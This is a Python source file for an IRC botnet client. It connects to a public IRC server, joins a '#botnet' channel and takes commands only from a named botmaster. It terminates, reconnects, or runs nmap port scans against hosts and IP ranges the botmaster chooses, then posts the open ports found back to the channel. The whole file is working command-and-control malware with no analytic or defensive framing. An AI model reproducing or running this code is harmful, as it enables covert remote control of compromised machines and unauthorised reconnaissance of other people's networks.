def main():
    import socket
    irc = 'irc.freenode.net'
    botmasters = ["tjgerot"]
    port = 6667
    botid = 0
    channel = '#botnet'
    sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sck.connect((irc, port))
    def post(msg, chat = False):
        if chat is True:
            packet = "PRIVMSG " + channel + " :" + msg + "\r\n"
            sck.send(packet.encode("UTF8"))
        else:
            sck.send((msg + "\r\n").encode("UTF8"))
    data = ''
    registered = False
    motd = False
    joined = False
    named = False
    network = []
    class Host:
        def __init__(self, ip):
            self.ip = ip
            self.protocols = []
            self.ports = []
        # self.hostname = ""
        # self.state = False
    def interpretCommands(command):
        if "KILL" in command.split()[0].upper():
            post("WILCO", True)
            if "VERBOSE" in command.split()[-1].upper():
                post("Goodbye World!", True)
                exit(0)
            else:
                exit(0)
        elif "RECONNECT" in command.split()[0].upper():
            return False
        elif "SCAN-RANGE" in command.split()[0].upper():
            post("WILCO", True)
            import nmap
            nm = nmap.PortScanner()
            start = int(command.split()[1].split(".")[-1])
            stop = int(command.split()[2].split(".")[-1])
            statements = []
            hosts = []
            for i in range(start, stop + 1):
                hostIP = command.split()[1].split(".")[0] + "." + command.split()[1].split(".")[1] + "." + command.split()[1].split(".")[2] + "." + str(i)
                print("Scanning " + hostIP)
                nm.scan(hostIP, str(command.split()[3]) + "-" + str(command.split()[4]))
                for host in nm.all_hosts():
                    h = Host(host)
                    h.hostname = nm[host].hostname()
                    h.state = "up" in nm[host].state()
                    h.protocols = nm[host].all_protocols()
                    for protocol in h.protocols:
                        h.ports.append(list(nm[host][protocol].keys()))
                    hosts.append(h)
                    network.append(h)
            print("HOSTS: ", hosts)
            for host in hosts:
                if host.state is True:
                    portlist = ""
                    for port in host.ports[0]:
                        portlist += str(port) + ", "
                    statements.append(host.ip + ": " + portlist[:-2])
            for statement in statements:
                if "VERBOSE" in command.split()[-1].upper():
                    post(statement, True)
                else:
                    print(statement)
        elif "SCAN" in command.split()[0].upper():
            post("WILCO", True)
            import nmap
            nm = nmap.PortScanner()
            nm.scan(command.split()[1], str(command.split()[2]) + "-" +  str(command.split()[3]))
            hosts = []
            for host in nm.all_hosts():
                h = Host(host)
                h.hostname = nm[host].hostname()
                h.state = "up" in nm[host].state()
                h.protocols = nm[host].all_protocols()
                for protocol in h.protocols:
                    h.ports.append(list(nm[host][protocol].keys()))
                hosts.append(h)
                network.append(h)
            statements = []
            for host in hosts:
                if host.state is True:
                    portlist = ""
                    for port in host.ports[0]:
                        portlist += str(port) + ", "
                    statements.append(host.ip + ": " + portlist[:-2])
            for statement in statements:
                if "VERBOSE" in command.split()[-1].upper():
                    post(statement, True)
                else:
                    print(statement)
        else:
            print("Unknown Command: " + command.split()[0])
    while True:
        data = sck.recv(1024)
        data = data.decode("UTF8")
        parts = data.split("\r\n")
        for part in parts:
            if "PING" in part:
                post("PONG " + part.split()[1])
                print("NETWORK> Playing Ping Pong")
            if "Welcome to the freenode Internet Relay Chat Network" in part:
                motd = True
            if motd is False:
                if len(part) is 0:
                    pass
                elif part.split("!")[0].replace(":", "") in botmasters:
                    if part.split("PRIVMSG")[1].replace(channel + " :", "").strip().upper().startswith("COMMAND"):
                        live = interpretCommands(part.split("PRIVMSG")[1].replace(channel + " :", "").strip().replace("COMMAND", "").replace("command", "").replace("Command", "").strip())
                        if live is False:
                            return True
                    elif "HELLO WORLD" in part.upper():
                        print("BOTMASTER> " + part.split("PRIVMSG")[1].replace(channel + " :", "").strip())
                        post("Hello Master!", True)
                    else:
                        print("BOTMASTER> " + part.split("PRIVMSG")[1].replace(channel + " :", "").strip())
                elif "NOTICE" in part:
                    print("SERVER> " + part.split("***")[1].strip())
                elif "= " + channel in part:
                    print("NAMED> " + part.split(" ")[-1].strip())
                elif "End of /NAMES list" in part:
                    named = True
                elif " MODE " or " JOIN " + channel in part:
                    pass
                else:
                    print("CHAT> " + part)
            if "End of /MOTD command" in part:
                motd = False
        if registered is False:
            nick = "bot" + str(botid)
            post("NICK " + nick)
            post("USER " + nick + " " + nick + " " + nick + " :" + nick)
            registered = True
        if joined is False:
            post("JOIN " + channel)
            joined = True
    print("#".encode("UTF8"), sck.recv(4096))
if __name__ == "__main__":
    while True:
        main()
